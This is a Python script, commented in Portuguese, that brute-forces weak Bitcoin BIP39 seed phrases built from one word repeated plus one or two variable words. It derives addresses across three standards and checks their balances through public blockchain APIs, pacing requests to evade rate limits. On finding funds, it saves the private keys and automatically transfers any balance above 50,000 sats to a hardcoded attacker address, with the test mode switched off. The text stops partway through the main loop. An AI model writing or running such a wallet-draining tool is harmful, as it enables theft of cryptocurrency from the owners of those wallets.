#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bitcoin Wallet Finder - VERSÃO ADAPTATIVA INTELIGENTE
======================================================
- Sistema adaptativo que começa com 1 carteira e aumenta gradualmente
- Reduz automaticamente se der erro 429
- 2 APIs principais + 1 backup
- 3 endereços por carteira (BIP44+49+84)
- Modo 11+1 e 10+2
"""

import os
import sys
import time
import json
import asyncio
import httpx
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from bip_utils import (
    Bip39SeedGenerator,
    Bip39MnemonicValidator,
    Bip39WordsNum,
    Bip44,
    Bip44Coins,
    Bip44Changes,
    Bip49,
    Bip49Coins,
    Bip84,
    Bip84Coins
)

# ============================================================================
# CONFIGURAÇÕES
# ============================================================================

TIMEOUT = 10
CONCURRENCY_MIN = 1  # Começa com 1 carteira
CONCURRENCY_MAX = 4  # Máximo 4 carteiras
CHECKPOINT_FILE = "checkpoint.json"
SALDO_FILE = "saldo.txt"
BIP39_FILE = "bip39-words.txt"
MAX_LOG_LINES = 40

# Configurações de saque automático
ENDERECO_DESTINO = "bc1qy34f7mqu952svl3eaklwqzw9v6h6paa5led9rs"
SALDO_MINIMO_SAQUE = 50000  # 0.0005 BTC
MODO_TESTE = False  # Mude para True para testar sem enviar



# ============================================================================
# CONTROLADOR ADAPTATIVO
# ============================================================================

class ControladorAdaptativo:
    """Controla a concorrência de forma adaptativa"""
    
    def __init__(self):
        self.concurrency_atual = CONCURRENCY_MIN  # Começa com 1
        self.sucessos_consecutivos = 0
        self.erros_429_consecutivos = 0
        self.ultima_mudanca = time.time()
        self.lock = asyncio.Lock()
    
    async def registrar_sucesso(self):
        """Registra um sucesso e aumenta concorrência se necessário"""
        async with self.lock:
            self.sucessos_consecutivos += 1
            self.erros_429_consecutivos = 0
            
            # Aumentar após 20 sucessos consecutivos
            if self.sucessos_consecutivos >= 20:
                tempo_desde_mudanca = time.time() - self.ultima_mudanca
                
                # Só aumenta se passou 30 segundos desde última mudança
                if tempo_desde_mudanca >= 30 and self.concurrency_atual < CONCURRENCY_MAX:
                    self.concurrency_atual += 1
                    self.sucessos_consecutivos = 0
                    self.ultima_mudanca = time.time()
                    return True, f"✅ Aumentando concorrência para {self.concurrency_atual} carteiras"
            
            return False, None
    
    async def registrar_erro_429(self):
        """Registra erro 429 e reduz concorrência se necessário"""
        async with self.lock:
            self.erros_429_consecutivos += 1
            self.sucessos_consecutivos = 0
            
            # Reduzir após 3 erros 429 consecutivos
            if self.erros_429_consecutivos >= 3:
                if self.concurrency_atual > CONCURRENCY_MIN:
                    self.concurrency_atual -= 1
                    self.erros_429_consecutivos = 0
                    self.ultima_mudanca = time.time()
                    
                    # Esperar 10 segundos antes de continuar
                    await asyncio.sleep(10)
                    return True, f"⚠️  Reduzindo concorrência para {self.concurrency_atual} carteiras (aguardando 10s)"
                else:
                    # Já está no mínimo, só espera
                    self.erros_429_consecutivos = 0
                    await asyncio.sleep(10)
                    return True, "⚠️  Concorrência no mínimo, aguardando 10s"
            
            return False, None
    
    def get_concurrency(self):
        """Retorna concorrência atual"""
        return self.concurrency_atual

# ============================================================================
# RATE LIMITER POR API
# ============================================================================

class APIRateLimiter:
    """Rate limiter individual para cada API"""
    
    def __init__(self, nome: str, req_por_segundo: float, limite_hora: Optional[int] = None, limite_mes: Optional[int] = None):
        self.nome = nome
        self.req_por_segundo = req_por_segundo
        self.intervalo = 1.0 / req_por_segundo
        self.ultima_requisicao = 0
        self.lock = asyncio.Lock()
        
        # Limite por hora
        self.limite_hora = limite_hora
        self.requisicoes_hora = []
        
        # Limite por mês (30 dias)
        self.limite_mes = limite_mes
        self.requisicoes_mes = []
        
        self.ativa = True
        
        # Controle de erro 429 INDIVIDUAL
        self.erros_429_consecutivos = 0
        self.desativado_ate = 0
    
    async def aguardar_vez(self) -> bool:
        """Aguarda até poder fazer a próxima requisição"""
        # Verificar se está desativada por erro 429
        if not self.ativa:
            agora = time.time()
            if agora < self.desativado_ate:
                return False  # Ainda desativada
            else:
                # Reativar automaticamente
                self.ativa = True
                self.erros_429_consecutivos = 0
                return True
        
        async with self.lock:
            agora = time.time()
            
            # Verificar limite por hora
            if self.limite_hora:
                self.requisicoes_hora = [t for t in self.requisicoes_hora if agora - t < 3600]
                
                if len(self.requisicoes_hora) >= self.limite_hora:
                    return False
            
            # Verificar limite por mês (30 dias = 2592000 segundos)
            if self.limite_mes:
                self.requisicoes_mes = [t for t in self.requisicoes_mes if agora - t < 2592000]
                
                if len(self.requisicoes_mes) >= self.limite_mes:
                    # Desativar por 1 mês
                    self.ativa = False
                    self.desativado_ate = agora + 2592000  # 30 dias
                    print(f"❌ {self.nome} atingiu limite mensal de {self.limite_mes} requisições! Desativado por 1 mês.")
                    return False
            
            # Aguardar intervalo
            tempo_desde_ultima = agora - self.ultima_requisicao
            
            if tempo_desde_ultima < self.intervalo:
                espera = self.intervalo - tempo_desde_ultima
                await asyncio.sleep(espera)
            
            self.ultima_requisicao = time.time()
            
            # Registrar requisição
            if self.limite_hora:
                self.requisicoes_hora.append(self.ultima_requisicao)
            if self.limite_mes:
                self.requisicoes_mes.append(self.ultima_requisicao)
            
            return True
    
    def registrar_erro_429(self):
        """Registra erro 429 e desativa temporariamente"""
        self.erros_429_consecutivos += 1
        
        # Desativar após 2 erros consecutivos
        if self.erros_429_consecutivos >= 2:
            self.ativa = False
            
            # Tempo de desativação progressivo
            if self.erros_429_consecutivos == 2:
                tempo_desativacao = 60  # 1 minuto
            elif self.erros_429_consecutivos == 3:
                tempo_desativacao = 180  # 3 minutos
            elif self.erros_429_consecutivos == 4:
                tempo_desativacao = 300  # 5 minutos
            else:
                tempo_desativacao = 600  # 10 minutos
            
            self.desativado_ate = time.time() + tempo_desativacao
            return tempo_desativacao
        
        return 0
    
    def resetar_erros_429(self):
        """Reseta contador de erros 429 após sucesso"""
        self.erros_429_consecutivos = 0
    
    def desativar(self):
        """Desativa a API"""
        self.ativa = False
    
    def ativar(self):
        """Reativa a API"""
        self.ativa = True

# ============================================================================
# CLASSE DE ESTATÍSTICAS
# ============================================================================

class Stats:
    def __init__(self):
        self.contador_total = 0
        self.contador_validas = 0
        self.contador_invalidas = 0
        self.carteiras_verificadas = 0
        self.carteiras_com_saldo_bip44 = 0
        self.carteiras_com_saldo_bip49 = 0
        self.carteiras_com_saldo_bip84 = 0
        
        # Estatísticas por API
        self.api_stats = {
            "Mempool": {"ok": 0, "err": 0},
            "Bitaps": {"ok": 0, "err": 0},
            "Blockchain": {"ok": 0, "err": 0},
            "Blockstream": {"ok": 0, "err": 0}
        }
        
        # Erros detalhados
        self.erros_detalhados = {}
        self.ultimos_erros = []
        
        # Logs de atividades
        self.logs = []
        
        self.inicio = time.time()
    
    def registrar_sucesso_api(self, api_name: str):
        """Registra sucesso de uma API"""
        if api_name in self.api_stats:
            self.api_stats[api_name]["ok"] += 1
    
    def registrar_erro_api(self, api_name: str, tipo_erro: str):
        """Registra erro de uma API"""
        if api_name in self.api_stats:
            self.api_stats[api_name]["err"] += 1
        
        if tipo_erro not in self.erros_detalhados:
            self.erros_detalhados[tipo_erro] = 0
        self.erros_detalhados[tipo_erro] += 1
        
        self.ultimos_erros.append({
            "api": api_name,
            "tipo": tipo_erro,
            "timestamp": datetime.now().strftime("%H:%M:%S")
        })
        if len(self.ultimos_erros) > 10:
            self.ultimos_erros.pop(0)
    
    def adicionar_log(self, mensagem: str):
        """Adiciona log de atividade"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.logs.append(f"[{timestamp}] {mensagem}")
        if len(self.logs) > MAX_LOG_LINES:
            self.logs.pop(0)
    
    def mostrar_painel(self, concurrency_atual: int):
        """Mostra painel de estatísticas"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        tempo_decorrido = time.time() - self.inicio
        horas = int(tempo_decorrido // 3600)
        minutos = int((tempo_decorrido % 3600) // 60)
        segundos = int(tempo_decorrido % 60)
        
        total_com_saldo = self.carteiras_com_saldo_bip44 + self.carteiras_com_saldo_bip49 + self.carteiras_com_saldo_bip84
        
        taxa = self.carteiras_verificadas / (tempo_decorrido / 60) if tempo_decorrido > 0 else 0
        
        print("=" * 80)
        print("🔍 BITCOIN WALLET FINDER - VERSÃO ADAPTATIVA")
        print("=" * 80)
        print(f"⏱️  Tempo: {horas:02d}:{minutos:02d}:{segundos:02d}")
        print(f"🎯 Concorrência atual: {concurrency_atual} carteiras em paralelo")
        print(f"📊 Testadas: {self.contador_total} | Válidas: {self.contador_validas} | Verificadas: {self.carteiras_verificadas}")
        print(f"💎 Com saldo: {total_com_saldo} (BIP44: {self.carteiras_com_saldo_bip44}, BIP49: {self.carteiras_com_saldo_bip49}, BIP84: {self.carteiras_com_saldo_bip84})")
        print(f"⚡ Taxa: {taxa:.1f} carteiras/min")
        print()
        
        # Status das APIs
        print("🌐 STATUS DAS APIs:")
        for api_name, stats in self.api_stats.items():
            total = stats["ok"] + stats["err"]
            taxa_sucesso = (stats["ok"] / total * 100) if total > 0 else 0
            print(f"  {api_name}: ✅ {stats['ok']} | ❌ {stats['err']} | Taxa: {taxa_sucesso:.1f}%")
        print()
        
        # Erros detalhados
        if self.erros_detalhados:
            print("📛 ERROS POR TIPO:")
            for tipo, count in sorted(self.erros_detalhados.items(), key=lambda x: x[1], reverse=True)[:5]:
                print(f"  {tipo}: {count}")
            print()
        
        # Últimos erros
        if self.ultimos_erros:
            print("🔍 ÚLTIMOS 10 ERROS:")
            for erro in self.ultimos_erros[-10:]:
                print(f"  [{erro['timestamp']}] {erro['api']}: {erro['tipo']}")
            print()
        
        # Logs de atividades
        print(f"📜 ÚLTIMAS {MAX_LOG_LINES} ATIVIDADES:")
        for log in self.logs[-MAX_LOG_LINES:]:
            print(f"  {log}")
        print("=" * 80)

# ============================================================================
# VALIDAÇÃO E DERIVAÇÃO
# ============================================================================

def validar_mnemonic(mnemonic: str) -> bool:
    """Valida mnemonic BIP39"""
    try:
        return Bip39MnemonicValidator().IsValid(mnemonic)
    except:
        return False

def mnemonic_para_seed(mnemonic: str, passphrase: str = "") -> bytes:
    """Gera seed a partir do mnemonic"""
    return Bip39SeedGenerator(mnemonic).Generate(passphrase)

def derivar_enderecos(seed: bytes) -> Dict[str, Dict[str, str]]:
    """Deriva os 3 tipos de endereços"""
    enderecos = {}
    
    # BIP44
    try:
        bip44_mst_ctx = Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
        bip44_acc = bip44_mst_ctx.Purpose().Coin().Account(0)
        bip44_chain = bip44_acc.Change(Bip44Changes.CHAIN_EXT)
        bip44_addr = bip44_chain.AddressIndex(0)
        
        enderecos["BIP44"] = {
            "tipo": "Legacy",
            "derivacao": "m/44'/0'/0'/0/0",
            "endereco": bip44_addr.PublicKey().ToAddress(),
            "priv_hex": bip44_addr.PrivateKey().Raw().ToHex(),
            "wif": bip44_addr.PrivateKey().ToWif(),
            "pub_hex": bip44_addr.PublicKey().RawCompressed().ToHex()
        }
    except:
        pass
    
    # BIP49
    try:
        bip49_mst_ctx = Bip49.FromSeed(seed, Bip49Coins.BITCOIN)
        bip49_acc = bip49_mst_ctx.Purpose().Coin().Account(0)
        bip49_chain = bip49_acc.Change(Bip44Changes.CHAIN_EXT)
        bip49_addr = bip49_chain.AddressIndex(0)
        
        enderecos["BIP49"] = {
            "tipo": "SegWit",
            "derivacao": "m/49'/0'/0'/0/0",
            "endereco": bip49_addr.PublicKey().ToAddress(),
            "priv_hex": bip49_addr.PrivateKey().Raw().ToHex(),
            "wif": bip49_addr.PrivateKey().ToWif(),
            "pub_hex": bip49_addr.PublicKey().RawCompressed().ToHex()
        }
    except:
        pass
    
    # BIP84
    try:
        bip84_mst_ctx = Bip84.FromSeed(seed, Bip84Coins.BITCOIN)
        bip84_acc = bip84_mst_ctx.Purpose().Coin().Account(0)
        bip84_chain = bip84_acc.Change(Bip44Changes.CHAIN_EXT)
        bip84_addr = bip84_chain.AddressIndex(0)
        
        enderecos["BIP84"] = {
            "tipo": "Native SegWit",
            "derivacao": "m/84'/0'/0'/0/0",
            "endereco": bip84_addr.PublicKey().ToAddress(),
            "priv_hex": bip84_addr.PrivateKey().Raw().ToHex(),
            "wif": bip84_addr.PrivateKey().ToWif(),
            "pub_hex": bip84_addr.PublicKey().RawCompressed().ToHex()
        }
    except:
        pass
    
    return enderecos

# ============================================================================
# VERIFICAÇÃO DE SALDO
# ============================================================================

async def verificar_saldo_mempool(client: httpx.AsyncClient, endereco: str) -> Tuple[Optional[bool], Optional[int], Optional[str], Optional[str]]:
    """API 1: Mempool.space"""
    try:
        url = f"https://mempool.space/api/address/{endereco}"
        response = await client.get(url, timeout=TIMEOUT)
        
        if response.status_code == 200:
            data = response.json()
            saldo = data.get('chain_stats', {}).get('funded_txo_sum', 0)
            return saldo > 0, saldo, "Mempool", None
        elif response.status_code == 429:
            return None, None, None, "429"
        else:
            return None, None, None, f"HTTP_{response.status_code}"
    except asyncio.TimeoutError:
        return None, None, None, "Timeout"
    except httpx.ConnectError:
        return None, None, None, "ConnectionError"
    except Exception as e:
        return None, None, None, f"Error_{type(e).__name__}"

async def verificar_saldo_blockstream(client: httpx.AsyncClient, endereco: str) -> Tuple[Optional[bool], Optional[int], Optional[str], Optional[str]]:
    """API 2: Blockstream"""
    try:
        url = f"https://blockstream.info/api/address/{endereco}"
        response = await client.get(url, timeout=TIMEOUT)
        
        if response.status_code == 200:
            data = response.json()
            saldo = data.get('chain_stats', {}).get('funded_txo_sum', 0)
            return saldo > 0, saldo, "Blockstream", None
        elif response.status_code == 429:
            return None, None, None, "429"
        else:
            return None, None, None, f"HTTP_{response.status_code}"
    except asyncio.TimeoutError:
        return None, None, None, "Timeout"
    except httpx.ConnectError:
        return None, None, None, "ConnectionError"
    except Exception as e:
        return None, None, None, f"Error_{type(e).__name__}"


async def verificar_saldo_blockchain(client: httpx.AsyncClient, endereco: str) -> Tuple[Optional[bool], Optional[int], Optional[str], Optional[str]]:
    """API 4: Blockchain.info"""
    try:
        url = f"https://blockchain.info/q/addressbalance/{endereco}"
        response = await client.get(url, timeout=TIMEOUT)
        
        if response.status_code == 200:
            saldo = int(response.text.strip())
            return saldo > 0, saldo, "Blockchain", None
        elif response.status_code == 429:
            return None, None, None, "429"
        else:
            return None, None, None, f"HTTP_{response.status_code}"
    except asyncio.TimeoutError:
        return None, None, None, "Timeout"
    except httpx.ConnectError:
        return None, None, None, "ConnectionError"
    except Exception as e:
        return None, None, None, f"Error_{type(e).__name__}"

async def verificar_saldo_bitaps(client: httpx.AsyncClient, endereco: str) -> Tuple[Optional[bool], Optional[int], Optional[str], Optional[str]]:
    """API 5: Bitaps"""
    try:
        url = f"https://api.bitaps.com/btc/v1/blockchain/address/state/{endereco}"
        response = await client.get(url, timeout=TIMEOUT)
        
        if response.status_code == 200:
            data = response.json()
            saldo = data.get('data', {}).get('balance', 0)
            return saldo > 0, saldo, "Bitaps", None
        elif response.status_code == 429:
            return None, None, None, "429"
        else:
            return None, None, None, f"HTTP_{response.status_code}"
    except asyncio.TimeoutError:
        return None, None, None, "Timeout"
    except httpx.ConnectError:
        return None, None, None, "ConnectionError"
    except Exception as e:
        return None, None, None, f"Error_{type(e).__name__}"


# ============================================================================
# DISTRIBUIDOR DE APIs
# ============================================================================

class DistribuidorAPIs:
    """Distribui requisições entre APIs"""
    
    def __init__(self, controlador: ControladorAdaptativo):
        self.controlador = controlador
        self.limiters = {
            "Mempool": APIRateLimiter("Mempool", 2.0),  # 2 req/s (principal)
            "Bitaps": APIRateLimiter("Bitaps", 1.0),  # 1 req/s
            "Blockchain": APIRateLimiter("Blockchain", 0.1),  # 0.1 req/s (1 a cada 10s)
            "Blockstream": APIRateLimiter("Blockstream", 3.0, limite_mes=500000),  # 3 req/s + 500k/mês
        }
        
        self.apis_principais = ["Mempool", "Bitaps", "Blockchain", "Blockstream"]
        self.indice_principal = 0
    
    def _escolher_api(self) -> str:
        """Escolhe próxima API disponível"""
        # Tentar todas as APIs
        for _ in range(len(self.apis_principais)):
            api = self.apis_principais[self.indice_principal]
            self.indice_principal = (self.indice_principal + 1) % len(self.apis_principais)
            
            if self.limiters[api].ativa:
                return api
        
        return None
    
    async def verificar_endereco(self, client: httpx.AsyncClient, endereco: str, stats: Stats) -> Tuple[bool, int, Optional[str]]:
        """Verifica saldo de um endereço"""
        
        api_name = self._escolher_api()
        
        if not api_name:
            stats.adicionar_log("❌ Nenhuma API disponível!")
            return False, 0, None
        
        pode_fazer = await self.limiters[api_name].aguardar_vez()
        
        if not pode_fazer:
            stats.adicionar_log(f"⚠️  {api_name} atingiu limite!")
            self.limiters[api_name].desativar()
            return False, 0, None
        
        try:
            if api_name == "Mempool":
                resultado = await verificar_saldo_mempool(client, endereco)
            elif api_name == "Blockstream":
                resultado = await verificar_saldo_blockstream(client, endereco)
            elif api_name == "Blockchain":
                resultado = await verificar_saldo_blockchain(client, endereco)
            elif api_name == "Bitaps":
                resultado = await verificar_saldo_bitaps(client, endereco)
            else:
                return False, 0, None
            
            tem_saldo, saldo, api_retornada, erro = resultado
            
            if erro:
                stats.registrar_erro_api(api_name, erro)
                
                if erro == "429":
                    mudou, msg = await self.controlador.registrar_erro_429()
                    if mudou and msg:
                        stats.adicionar_log(msg)
                
                return False, 0, None
            
            stats.registrar_sucesso_api(api_name)
            
            # Registrar sucesso no controlador
            mudou, msg = await self.controlador.registrar_sucesso()
            if mudou and msg:
                stats.adicionar_log(msg)
            
            return tem_saldo, saldo, api_name
            
        except Exception as e:
            stats.registrar_erro_api(api_name, f"Exception_{type(e).__name__}")
            return False, 0, None

# ============================================================================
# SAQUE AUTOMÁTICO
# ============================================================================

async def sacar_automaticamente(wif: str, saldo_sats: int) -> Tuple[bool, str]:
    """
    Realiza saque automático para endereço de destino
    Retorna: (sucesso, mensagem/txid)
    """
    try:
        from bit import Key
        
        # Importar chave privada
        key = Key(wif)
        endereco_origem = key.address
        
        # Calcular taxa baseada no saldo
        if saldo_sats < 50000:
            # Saldo pequeno: taxa máxima 50% do saldo
            taxa_max_sats = int(saldo_sats * 0.5)
            prioridade = "baixa"
            taxa_sat_vb = 50  # 50 sat/vB - Confirma em ~10-30 min
        elif saldo_sats < 500000:
            # Saldo médio: taxa máxima 20% do saldo
            taxa_max_sats = int(saldo_sats * 0.2)
            prioridade = "media"
            taxa_sat_vb = 100  # 100 sat/vB - Confirma em ~5-10 min
        else:
            # Saldo grande: sem limite de taxa
            taxa_max_sats = None
            prioridade = "maxima"
            taxa_sat_vb = 150  # 150 sat/vB - Confirma em ~1-5 min (próximo bloco!)
        
        # Estimar tamanho da transação (1 input, 1 output)
        tamanho_tx = 192 if endereco_origem.startswith('1') else 141  # P2PKH vs P2WPKH
        taxa_total_sats = taxa_sat_vb * tamanho_tx
        
        # Verificar se taxa não excede limite
        if taxa_max_sats and taxa_total_sats > taxa_max_sats:
            taxa_total_sats = taxa_max_sats
            taxa_sat_vb = taxa_total_sats // tamanho_tx
        
        # Calcular valor a enviar
        valor_enviar_sats = saldo_sats - taxa_total_sats
        
        if valor_enviar_sats <= 0:
            return False, "Saldo insuficiente para cobrir taxa"
        
        # Criar lista de outputs
        outputs = [(ENDERECO_DESTINO, valor_enviar_sats, 'satoshi')]
        
        if MODO_TESTE:
            # Modo de teste: NÃO envia, apenas simula
            txid_simulado = f"TESTE_{int(time.time())}_{saldo_sats}"
            print(f"\n⚠️  MODO DE TESTE ATIVADO - TRANSAÇÃO NÃO FOI ENVIADA!")
            print(f"   Endereço origem: {endereco_origem}")
            print(f"   Endereço destino: {ENDERECO_DESTINO}")
            print(f"   Valor: {valor_enviar_sats} sats ({valor_enviar_sats/100000000:.8f} BTC)")
            print(f"   Taxa: {taxa_sat_vb} sat/vB ({taxa_total_sats} sats total)")
            print(f"   Tamanho TX: ~{tamanho_tx} bytes")
            print(f"   Prioridade: {prioridade.upper()}")
            print(f"\n   Para enviar de verdade, mude MODO_TESTE = False no script!\n")
            return True, txid_simulado
        
        # Criar e enviar transação
        try:
            txid = key.send(outputs, fee=taxa_total_sats, absolute_fee=True)
            return True, txid
        except Exception as e:
            erro_str = str(e).lower()
            
            # Se taxa muito baixa, tentar com taxa 10% maior
            if 'fee' in erro_str or 'insufficient' in erro_str:
                taxa_total_sats_nova = int(taxa_total_sats * 1.1)
                valor_enviar_sats_novo = saldo_sats - taxa_total_sats_nova
                
                if valor_enviar_sats_novo > 0:
                    outputs_novo = [(ENDERECO_DESTINO, valor_enviar_sats_novo, 'satoshi')]
                    txid = key.send(outputs_novo, fee=taxa_total_sats_nova, absolute_fee=True)
                    return True, txid
            
            return False, f"Erro ao enviar: {str(e)[:100]}"
    
    except Exception as e:
        return False, f"Erro geral: {str(e)[:100]}"

# ============================================================================
# PROCESSAMENTO
# ============================================================================

async def processar_carteira(
    client: httpx.AsyncClient,
    mnemonic: str,
    palavra_base: str,
    palavra_var1: str,
    palavra_var2: Optional[str],
    stats: Stats,
    distribuidor: DistribuidorAPIs
):
    """Processa uma carteira"""
    
    try:
        seed = mnemonic_para_seed(mnemonic)
        enderecos = derivar_enderecos(seed)
        
        for bip_type, info in enderecos.items():
            endereco = info["endereco"]
            stats.adicionar_log(f"🔍 {bip_type} | {endereco[:24]}...")
            
            tem_saldo, saldo, api_name = await distribuidor.verificar_endereco(client, endereco, stats)
            
            if tem_saldo:
                if bip_type == "BIP44":
                    stats.carteiras_com_saldo_bip44 += 1
                elif bip_type == "BIP49":
                    stats.carteiras_com_saldo_bip49 += 1
                elif bip_type == "BIP84":
                    stats.carteiras_com_saldo_bip84 += 1
                
                saldo_btc = saldo / 100000000.0
                stats.adicionar_log(
                    f"✅ SALDO: {saldo} sat ({saldo_btc:.8f} BTC) | "
                    f"{bip_type} | {endereco[:24]}... | {api_name}"
                )
                
                salvar_carteira_com_saldo(palavra_base, palavra_var1, palavra_var2, mnemonic, info, bip_type, saldo, saldo_btc, api_name)
                
                # Tentar saque automático se saldo >= mínimo
                if saldo >= SALDO_MINIMO_SAQUE:
                    wif = info['wif']
                    sucesso, resultado = await sacar_automaticamente(wif, saldo)
                    
                    if sucesso:
                        stats.adicionar_log(f"✅ Saque automático realizado! TXID: {resultado[:16]}...")
                    else:
                        stats.adicionar_log(f"⚠️  Saque não realizado: {resultado}")
        
        stats.carteiras_verificadas += 1
        await asyncio.sleep(0.1)
        
    except Exception as e:
        stats.adicionar_log(f"❌ Erro: {type(e).__name__}")

# ============================================================================
# SALVAMENTO
# ============================================================================

def salvar_carteira_com_saldo(
    palavra_base: str,
    palavra_var1: str,
    palavra_var2: Optional[str],
    mnemonic: str,
    info: Dict[str, str],
    bip_type: str,
    saldo_sat: int,
    saldo_btc: float,
    api_name: str
):
    """Salva carteira com saldo"""
    with open(SALDO_FILE, "a") as f:
        f.write("=" * 80 + "\n")
        f.write("💎 CARTEIRA COM SALDO ENCONTRADA\n")
        f.write("=" * 80 + "\n")
        f.write(f"Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"API: {api_name}\n")
        f.write(f"Tipo: {bip_type} ({info['tipo']})\n")
        f.write(f"Derivação: {info['derivacao']}\n\n")
        
        if palavra_var2:
            f.write(f"Palavra Base: {palavra_base} (repetida 10x)\n")
            f.write(f"Palavras Variáveis: {palavra_var1}, {palavra_var2}\n")
        else:
            f.write(f"Palavra Base: {palavra_base} (repetida 11x)\n")
            f.write(f"Palavra Variável: {palavra_var1}\n")
        
        f.write(f"\nMnemonic:\n{mnemonic}\n\n")
        f.write(f"Endereço: {info['endereco']}\n")
        f.write(f"Saldo: {saldo_sat} satoshis ({saldo_btc:.8f} BTC)\n\n")
        f.write(f"Chave Privada (WIF): {info['wif']}\n")
        f.write(f"Chave Privada (HEX): {info['priv_hex']}\n")
        f.write(f"Chave Pública (HEX): {info['pub_hex']}\n")
        f.write("=" * 80 + "\n\n")

def salvar_checkpoint(palavra_base: str, palavra_var1: str, palavra_var2: Optional[str], stats: Stats, modo: str, concurrency: int):
    """Salva checkpoint"""
    checkpoint = {
        "modo": modo,
        "palavra_base": palavra_base,
        "palavra_var1": palavra_var1,
        "palavra_var2": palavra_var2,
        "contador_total": stats.contador_total,
        "contador_validas": stats.contador_validas,
        "contador_invalidas": stats.contador_invalidas,
        "carteiras_verificadas": stats.carteiras_verificadas,
        "carteiras_com_saldo_bip44": stats.carteiras_com_saldo_bip44,
        "carteiras_com_saldo_bip49": stats.carteiras_com_saldo_bip49,
        "carteiras_com_saldo_bip84": stats.carteiras_com_saldo_bip84,
        "concurrency": concurrency,
        "timestamp": datetime.now().isoformat()
    }
    
    with open(CHECKPOINT_FILE, 'w') as f:
        json.dump(checkpoint, f, indent=2)

# ============================================================================
# MAIN
# ============================================================================

async def main():
    """Função principal"""
    
    if not os.path.exists(BIP39_FILE):
        print(f"❌ Arquivo {BIP39_FILE} não encontrado!")
        return
    
    with open(BIP39_FILE, 'r') as f:
        palavras = [linha.strip() for linha in f if linha.strip()]
    
    if len(palavras) != 2048:
        print(f"⚠️  Esperadas 2048 palavras, encontradas {len(palavras)}")
    
    print("Escolha o modo:")
    print("1. Modo 11+1")
    print("2. Modo 10+2")
    
    escolha = input("Digite 1 ou 2: ").strip()
    modo = "11+1" if escolha == "1" else "10+2"
    
    stats = Stats()
    controlador = ControladorAdaptativo()
    
    start_base_idx = 0
    start_var1_idx = 0
    start_var2_idx = 0
    
    if os.path.exists(CHECKPOINT_FILE):
        with open(CHECKPOINT_FILE, 'r') as f:
            checkpoint = json.load(f)
        
        stats.contador_total = checkpoint.get('contador_total', 0)
        stats.contador_validas = checkpoint.get('contador_validas', 0)
        stats.contador_invalidas = checkpoint.get('contador_invalidas', 0)
        stats.carteiras_verificadas = checkpoint.get('carteiras_verificadas', 0)
        stats.carteiras_com_saldo_bip44 = checkpoint.get('carteiras_com_saldo_bip44', 0)
        stats.carteiras_com_saldo_bip49 = checkpoint.get('carteiras_com_saldo_bip49', 0)
        stats.carteiras_com_saldo_bip84 = checkpoint.get('carteiras_com_saldo_bip84', 0)
        
        # Restaurar concorrência
        if 'concurrency' in checkpoint:
            controlador.concurrency_atual = checkpoint['concurrency']
        
        palavra_base = checkpoint['palavra_base']
        palavra_var1 = checkpoint['palavra_var1']
        palavra_var2 = checkpoint.get('palavra_var2')
        
        try:
            start_base_idx = palavras.index(palavra_base)
            start_var1_idx = palavras.index(palavra_var1)
            
            if modo == "10+2" and palavra_var2:
                start_var2_idx = palavras.index(palavra_var2) + 1
                if start_var2_idx >= len(palavras):
                    start_var1_idx += 1
                    start_var2_idx = 0
                    if start_var1_idx >= len(palavras):
                        start_base_idx += 1
                        start_var1_idx = 0
            else:
                start_var1_idx += 1
                if start_var1_idx >= len(palavras):
                    start_base_idx += 1
                    start_var1_idx = 0
                start_var2_idx = 0
        except ValueError:
            start_base_idx = 0
            start_var1_idx = 0
            start_var2_idx = 0
    
    print(f"\n🚀 Iniciando busca em modo {modo}...")
    print(f"🎯 Sistema ADAPTATIVO: Começa com {CONCURRENCY_MIN}, aumenta até {CONCURRENCY_MAX}")
    print(f"📊 3 derivações por mnemonic (BIP44+49+84)")
    print("\nPressione Ctrl+C para parar com segurança\n")
    
    async with httpx.AsyncClient() as client:
        distribuidor = DistribuidorAPIs(controlador)
        tarefas_pendentes = []
        
        try:
            if modo == "11+1":
                for i in range(start_base_idx, len(palavras)):
                    palavra_base = palavras[i]
                    start_j = start_var1_idx if i == start_base_idx else 0
                    
                    for j in range(start_j, len(palavras)):
                        palavra_var1 = palavras[j]
                        mnemonic = " ".join([palavra_base] * 11 + [palavra_var1])
                        stats.contador_total += 1
                        
                        if validar_mnemonic(mnemonic):
                            stats.contador_validas += 1
                            stats.adicionar_log(f"✔️ BIP39 Válida | {mnemonic[:60]}...")
                            
                            tarefa = asyncio.create_task(
                                processar_carteira(client, mnemonic, palavra_base, palavra_var1, None, stats, distribuidor)
                            )
                            tarefas_pendentes.append(tarefa)
                            
                            # Limitar tarefas (ADAPTATIVO!)
                            concurrency = controlador.get_concurrency()
                            if len(tarefas_pendentes) >= concurrency:
                                done, tarefas_pendentes = await asyncio.wait(
                                    tarefas_pendentes,
                                    return_when=asyncio.FIRST_COMPLETED
                                )
                                tarefas_pendentes = list(tarefas_pendentes)
                        else:
                            stats.contador_invalidas += 1
                        
                        if stats.contador_total % 10 == 0:
                            stats.mostrar_painel(controlador.get_concurrency())
                        
                        if stats.contador_total % 100 == 0:
                            salvar_checkpoint(palavra_base, palavra_var1, None, stats, modo, controlador.get_concurrency())
            
            else:  # modo 10+2
                for i in range(start_base_idx, len(palavras)):
                    palavra_base = palavras[i]
                    start_j = start_var1_idx if i == start_base_idx else 0
                    
                    for j in range(start_j, len(palavras)):
                        palavra_var1 = palavras[j]
                        start_k = start_var2_idx if i == start_base_idx and j == start_var1_idx else 0
                        
                        for k in range(start_k, len(palavras)):
                            palavra_var2 = palavras[k]
                            mnemonic = " ".join([palavra_base] * 10 + [palavra_var1, palavra_var2])
                            stats.contador_total += 1
                            
                            if validar_mnemonic(mnemonic):
                                stats.contador_validas += 1
                                stats.adicionar_log(f"✔️ BIP39 Válida | {mnemonic[:60]}...")
                                
                                tarefa = asyncio.create_task(
                                    processar_carteira(client, mnemonic, palavra_base, palavra_var1, palavra_var2, stats, distribuidor)
                                )
                                tarefas_pendentes.append(tarefa)
                                
                                # Limitar tarefas (ADAPTATIVO!)
                                concurrency = controlador.get_concurrency()
                                if len(tarefas_pendentes) >= concurrency:
                                    done, tarefas_pendentes = await asyncio.wait(
                                        tarefas_pendentes,
                                        return_when=asyncio.FIRST_COMPLETED
                                    )
                                    tarefas_pendentes = list(tarefas_pendentes)
                            else:
                                stats.contador_invalidas += 1
                            
                            if stats.contador_total % 10 == 0:
